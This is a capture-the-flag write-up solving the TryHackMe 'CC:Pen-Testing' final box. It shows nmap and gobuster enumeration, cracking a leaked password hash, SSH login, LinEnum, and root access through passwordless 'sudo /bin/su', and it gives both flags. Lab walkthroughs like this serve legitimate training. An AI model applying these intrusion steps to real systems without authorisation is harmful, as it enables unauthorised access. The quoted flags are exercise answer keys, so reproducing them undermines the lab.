## Description
Solve the final exam of the CC:Pen-Testing box in TryHackMe.  
The goal is to exploit the target machine and get the content of user.txt and root.txt.

## Solution
ip of the target host: 10.10.193.79

Reconnaissance: scan the target machine to enumerate ports and services.
```shell
nmap -sV 10.10.193.79
```
It gives:
```shell
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Meanwhile run gobuster to find hidden directories.
```shell
gobuster dir -u http://10.10.193.79/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 64
```
We found the hidden diretory /secret. The url http://10.10.193.79/secret/ yield a blank page.  
We can bruteforce the directory /secret to find hidden files:
```shell
gobuster dir -u http://10.10.193.79/secret/ -w /usr/share/dirbus ter/wordlists/directory-list-2.3-medium.txt -t 64 -x txt,php,html,css,js
```
We managed to find the file secret.txt, containing a username and a hash:  
nyan:046385855FC9580393853D8E81F240B66FE9A7B8

Now we can try to break the hash to find the password of nyan. Hopefully is the same password used to login through ssh.  
In order to break the hash we can use the CrackStation (https://crackstation.net/).  
Decrypting the hash we get nyan.

We can now use the retrieved credentials to try to get access to the machine using ssh:
```shell
ssh nyan@10.10.193.79
```
It worked !

```shell
nyan@ubuntu:~$ ls
user.txt
nyan@ubuntu:~$ cat user.txt 
supernootnoot
```
The content of user.txt is supernootnoot.

Final step is to find the file root.txt. The name of the file suggests that the flag is only available under root.  
We download LinEnum, useful tool which scans the system to find ways to escalate the privileges. In the scan report, we see the following:
```shell
[+] We can sudo without supplying a password!                                                                     
Matching Defaults entries for nyan on ubuntu:                                                                     
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/
bin                                                                                                               
                                                                                                                  
User nyan may run the following commands on ubuntu:                                                               
    (root) NOPASSWD: /bin/su
```

Therefore we can become root using: 
```shell
sudo /bin/su
``` 

In the home directory of root we can find the root.txt file.
```shell
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt 
congratulations!!!!
```

The content of root.txt is congratulations!!!



